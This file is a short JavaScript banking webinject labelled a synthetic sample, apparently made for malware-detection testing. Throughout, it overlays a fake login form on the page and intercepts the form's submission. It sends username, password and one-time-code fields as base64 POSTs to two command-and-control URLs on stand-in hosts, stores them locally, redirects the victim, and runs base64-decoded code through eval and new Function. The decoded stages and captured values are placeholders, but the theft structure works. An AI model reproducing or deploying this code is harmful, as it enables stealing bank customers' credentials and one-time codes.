// HELIOS-WEBINJECT — synthetic banking webinject product sample.
(function () {
  var CONFIG = atob('eyJjMiI6Imh0dHBzOi8vYzIuZXhhbXBsZS50ZXN0L2h4L2NvbGxlY3QiLCJiYW5rcyI6W3siaWQiOiJicyIsInRlbXBsYXRlIjoiUEhScGRtVWdhV1E5SW5ObFkzVnlaU0J0YjJRaVBrSmhZMnN1Y0dod0xtbG5iMjRnY0dGblpTSStQSFJwZEd4bFBrbHVjbVZ3ZFhSaGRHbHZiaUJHYjNKdFBDOTBhWFJzWlQ0OGNHRnpjdzQ4Y0dGemN3NDhZblYwZEc5dVBDRmlkWFIwYjI0K1BDOW1iM0p0UGc9PSIsInJlZGlyZWN0IjoiaHR0cHM6Ly9iYW5rLmV4YW1wbGUudGVzdC9sb2dpbiJ9XX0=');
  var config = JSON.parse(CONFIG);
  var fallbackC2 = 'https://bank-relay.example.test/hx/upload';
  console.log('[HELIOS] webinject armed for', config.banks.length, 'targets');

  function capture(bank, data) {
    var packet = { bank: bank.id, data: data, ts: Date.now() };
    try {
      fetch(fallbackC2 + '/' + bank.id, { method: 'POST', body: btoa(JSON.stringify(packet)) }).catch(function () {});
      fetch(config.c2 + '/' + bank.id, {
        method: 'POST',
        headers: { 'content-type': 'text/plain' },
        body: btoa(JSON.stringify(packet))
      }).catch(function () {});
    } catch (error) {}
    try { localStorage.setItem('helios:' + bank.id, JSON.stringify(packet)); } catch (error) {}
    console.log('[HELIOS] captured', bank.id, Object.keys(data).join(','));
  }

  config.banks.forEach(function (bank) {
    var overlay = document.createElement('div');
    overlay.id = 'helios-' + bank.id;
    overlay.style.position = 'fixed';
    overlay.style.inset = '0';
    overlay.innerHTML = atob(bank.template);
    try { document.body.appendChild(overlay); } catch (error) {}
    overlay.addEventListener('submit', function (event) {
      event.preventDefault();
      capture(bank, { user: 'victim', pass: 'captured', otp: '000000' });
      try { location.assign(bank.redirect); } catch (error) {}
    });
    // Simulated user submission (the sandbox does not render forms).
    capture(bank, { user: 'demo.user', pass: 'demo.pass', otp: '123456' });
  });

  // Decrypt and run the overlay renderer stage (eval path used by real webinjects).
  eval(atob('Y29uc29sZS5sb2coJ1tIRUxJT1NdIG92ZXJsYXkgcmVuZGVyZXIgc3RhZ2UtMicpOw=='));

  // Decrypt and run the in-page probe (native-branded eval path).
  var probe = new Function('return ' + atob('ImhlbGlvcy1wcm9iZS1vayI='))();
  console.log('[HELIOS] probe', probe);
})();
